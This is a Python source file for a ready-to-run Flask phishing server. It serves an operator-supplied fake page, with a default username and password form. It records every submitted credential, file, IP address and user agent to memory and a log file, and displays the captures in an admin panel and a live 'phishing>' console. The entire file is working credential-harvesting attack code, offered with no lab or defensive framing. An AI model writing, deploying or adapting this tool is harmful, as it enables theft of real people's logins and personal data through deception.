import os
import sys
import time
import json
import base64
import socket
import uuid
import threading
import mimetypes
import subprocess
import webbrowser
from datetime import datetime
from io import BytesIO
from flask import Flask, request, make_response, session, send_file

class PhishingServer:
    def __init__(self):
        self.app = Flask(__name__)
        self.app.secret_key = str(uuid.uuid4())
        self.captured_data = []
        self.active_sessions = {}
        self.hosted_assets = {}
        self.page_html = ""
        self.server_port = 8080
        self.log_path = None
        self.require_credentials = True
        self.server_running = True
        self.setup_routes()
    
    def setup_routes(self):
        @self.app.before_request
        def initialize_session():
            if "session_id" not in session:
                new_id = str(uuid.uuid4())
                session["session_id"] = new_id
                self.active_sessions[new_id] = {
                    "client_ip": request.remote_addr,
                    "user_agent": request.headers.get("User-Agent", ""),
                    "first_seen": time.time(),
                    "last_activity": time.time()
                }
            else:
                session_id = session["session_id"]
                if session_id in self.active_sessions:
                    self.active_sessions[session_id]["last_activity"] = time.time()
        
        @self.app.route("/", methods=["GET"])
        def serve_phishing_page():
            if not self.page_html:
                return "<h1>No HTML content configured</h1>", 500
            response = make_response(self.page_html)
            response.headers["Content-Type"] = "text/html"
            response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
            response.headers["Pragma"] = "no-cache"
            response.headers["Expires"] = "0"
            return response
        
        @self.app.route("/", methods=["POST"])
        def capture_submitted_data():
            extracted_data = {}
            content_type = request.content_type or ""
            
            if "application/json" in content_type:
                try:
                    extracted_data = request.get_json(force=True, silent=True) or {}
                except Exception:
                    extracted_data = {}
            elif "multipart/form-data" in content_type:
                for field_name, file_obj in request.files.items():
                    file_content = file_obj.read()
                    if len(file_content) > 200:
                        extracted_data[field_name] = f"[B64_FILE:{len(file_content)}bytes]"
                    else:
                        extracted_data[field_name] = file_content.decode(errors="ignore")
                for field_name, field_value in request.form.items():
                    extracted_data[field_name] = field_value
            else:
                for field_name, field_value in request.form.items():
                    extracted_data[field_name] = field_value
            
            session_id = session.get("session_id", "N/A")
            client_ip = request.remote_addr
            current_time = time.time()
            
            capture_record = {
                "session": session_id,
                "ip_address": client_ip,
                "user_agent": request.headers.get("User-Agent", "Unknown"),
                "timestamp": current_time,
                "formatted_time": datetime.fromtimestamp(current_time).strftime("%Y-%m-%d %H:%M:%S"),
                "submitted_data": extracted_data
            }
            
            self.captured_data.append(capture_record)
            
            if self.log_path:
                try:
                    with open(self.log_path, "a", encoding="utf-8") as log_file:
                        json.dump(capture_record, log_file)
                        log_file.write("\n")
                except Exception:
                    pass
            
            print(f"CAPTURE: New submission from {client_ip}")
            print(f"  Session: {session_id}")
            print(f"  Data: {extracted_data}")
            print("-" * 50)
            
            success_html = """
            <html>
            <head>
                <title>Thank You</title>
                <style>
                    body { font-family: Arial, sans-serif; background: #f0f0f0; padding: 50px; text-align: center; }
                    .message { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
                    h2 { color: #4CAF50; }
                </style>
                <meta http-equiv="refresh" content="3;url=/">
            </head>
            <body>
                <div class="message">
                    <h2>Submission Successful</h2>
                    <p>Thank you for your participation.</p>
                    <p>Redirecting...</p>
                </div>
            </body>
            </html>
            """
            
            response = make_response(success_html)
            return response
        
        @self.app.route("/admin", methods=["GET"])
        def admin_interface():
            admin_html = """
            <html>
            <head>
                <title>Admin Panel</title>
                <style>
                    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 20px; background: #f5f5f5; }
                    h1 { color: #333; border-bottom: 2px solid #4CAF50; padding-bottom: 10px; }
                    .section { background: white; padding: 20px; margin: 20px 0; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
                    pre { background: #f8f9fa; padding: 15px; border-radius: 5px; overflow-x: auto; }
                    table { width: 100%; border-collapse: collapse; margin: 10px 0; }
                    th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
                    th { background: #4CAF50; color: white; }
                    .stats { display: flex; gap: 20px; margin: 20px 0; }
                    .stat-box { background: white; padding: 15px; border-radius: 8px; flex: 1; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
                    .stat-value { font-size: 24px; font-weight: bold; color: #4CAF50; }
                    .refresh-btn { background: #4CAF50; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
                    .refresh-btn:hover { background: #45a049; }
                </style>
            </head>
            <body>
                <h1>Phishing Server Admin Panel</h1>
                
                <div class="stats">
                    <div class="stat-box">
                        <div class="stat-value">""" + str(len(self.captured_data)) + """</div>
                        <div>Total Captures</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value">""" + str(len(self.active_sessions)) + """</div>
                        <div>Active Sessions</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value">""" + str(self.server_port) + """</div>
                        <div>Server Port</div>
                    </div>
                </div>
                
                <div class="section">
                    <h2>Latest Captures</h2>
                    <button class="refresh-btn" onclick="location.reload()">Refresh</button>
                    <table>
                        <tr><th>#</th><th>IP Address</th><th>Session ID</th><th>Data</th><th>Time</th></tr>
            """
            
            for idx, capture in enumerate(reversed(self.captured_data[-10:]), 1):
                data_preview = str(capture['submitted_data'])[:100]
                if len(str(capture['submitted_data'])) > 100:
                    data_preview += "..."
                admin_html += f"""
                <tr>
                    <td>{idx}</td>
                    <td>{capture['ip_address']}</td>
                    <td><code>{capture['session'][:8]}...</code></td>
                    <td><pre style='margin:0;'>{data_preview}</pre></td>
                    <td>{capture['formatted_time']}</td>
                </tr>
                """
            
            admin_html += """
                    </table>
                </div>
                
                <div class="section">
                    <h2>Active Sessions</h2>
                    <pre>
            """
            
            for session_id, session_data in self.active_sessions.items():
                time_diff = time.time() - session_data['last_activity']
                admin_html += f"{session_id[:12]}... | {session_data['client_ip']} | Active {int(time_diff)}s ago\n"
            
            admin_html += """
                    </pre>
                </div>
            </body>
            </html>
            """
            
            response = make_response(admin_html)
            return response
    
    def get_local_ip(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect(("8.8.8.8", 80))
            ip_addr = sock.getsockname()[0]
            sock.close()
            return ip_addr
        except Exception:
            return "127.0.0.1"
    
    def print_captures(self):
        if not self.captured_data:
            print("No captures yet.")
            return
        
        print("=" * 80)
        print("CAPTURED DATA")
        print("=" * 80)
        for idx, capture in enumerate(self.captured_data, 1):
            print(f"[{idx}] {capture['formatted_time']}")
            print(f"   IP: {capture['ip_address']}")
            print(f"   Session: {capture['session']}")
            print(f"   Data: {capture['submitted_data']}")
        print("=" * 80)

    def live_console_menu(self):
        print("=" * 80)
        print("PHISHING SERVER LIVE CONSOLE")
        print("=" * 80)
        print("Commands: list, save <file>, sessions, clear, stats, exit")
        print("=" * 80)

        while True:
            try:
                command = input("phishing> ").strip().lower()

                if command in ["list", "ls"]:
                    self.print_captures()

                elif command.startswith("save "):
                    filename = command.split(" ", 1)[1]
                    try:
                        with open(filename, "w", encoding="utf-8") as f:
                            json.dump(self.captured_data, f, indent=2, default=str)
                        print(f"Data saved to {filename}")
                    except Exception as e:
                        print(f"Error saving file: {e}")

                elif command == "sessions":
                    print("=" * 60)
                    print("ACTIVE SESSIONS")
                    print("=" * 60)
                    for sid, data in self.active_sessions.items():
                        age = int(time.time() - data['last_activity'])
                        print(f"{sid[:12]}... | {data['client_ip']} | {age}s ago")
                    print("=" * 60)

                elif command == "clear":
                    self.captured_data.clear()
                    print("All captures cleared")

                elif command == "stats":
                    print(f"Total Captures: {len(self.captured_data)}")
                    print(f"Active Sessions: {len(self.active_sessions)}")
                    print(f"Server Port: {self.server_port}")
                    print(f"Log File: {self.log_path or 'None'}")

                elif command in ["exit", "quit", "q"]:
                    print("Exiting console...")
                    # Shut down the server as well if you exit from the console
                    os._exit(0)

                elif command == "help":
                    print("list/ls     - Show all captured data")
                    print("save <file> - Save captures to JSON file")
                    print("sessions    - Show active sessions")
                    print("clear       - Clear all captures")
                    print("stats       - Show server statistics")
                    print("exit/quit   - Exit console and stop server")

                else:
                    print("Unknown command. Type 'help' for available commands.")

            except KeyboardInterrupt:
                print("Exiting console...")
                os._exit(0)
            except Exception as e:
                print(f"Error: {e}")

    def run_server_thread(self):
        # Run Flask server in a background thread
        def _run():
            local_ip = self.get_local_ip()

            print("=" * 80)
            print("PHISHING SERVER STARTING")
            print("=" * 80)
            print(f"Local URL: http://localhost:{self.server_port}")
            print(f"Network URL: http://{local_ip}:{self.server_port}")
            print(f"Admin Panel: http://localhost:{self.server_port}/admin")
            print("=" * 80)
            print("Server is running... Press Ctrl+C to stop")
            print("=" * 80)

            try:
                self.app.run(host="0.0.0.0", port=self.server_port, debug=False, threaded=True)
            except Exception as e:
                print(f"Server error: {e}")
        thread = threading.Thread(target=_run, daemon=True)
        thread.start()

def main():
    server = PhishingServer()

    print("=" * 80)
    print("PHISHING SERVER SETUP")
    print("=" * 80)

    print("Enter your HTML phishing page content:")
    print("(Type 'END' on a new line to finish)")
    lines = []
    while True:
        try:
            line = input()
        except EOFError:
            break
        if line.strip() == "END":
            break
        lines.append(line)

    if not lines:
        print("No HTML content provided. Using default test page.")
        server.page_html = """
        <html>
        <head><title>Test Page</title></head>
        <body>
            <h1>Test Phishing Page</h1>
            <form method="POST">
                <input type="text" name="username" placeholder="Username"><br>
                <input type="password" name="password" placeholder="Password"><br>
                <input type="submit" value="Submit">
            </form>
        </body>
        </html>
        """
    else:
        server.page_html = "\n".join(lines)

    port_input = input(f"Server port [{server.server_port}]: ").strip()
    if port_input:
        try:
            server.server_port = int(port_input)
        except Exception:
            print("Invalid port number, using default 8080")

    log_input = input("Log file path (press Enter for none): ").strip()
    if log_input:
        server.log_path = log_input

    print("=" * 80)
    print("LAUNCHING SERVER + CONSOLE IN SAME TERMINAL")
    print("=" * 80)

    # Run Flask server in background thread, keep interactive console in main thread
    server.run_server_thread()
    # Now the live console is in the "main" thread/terminal, and the server runs in background
    try:
        server.live_console_menu()
    except KeyboardInterrupt:
        print("Exiting server and console...")
        os._exit(0)

if __name__ == "__main__":
    main()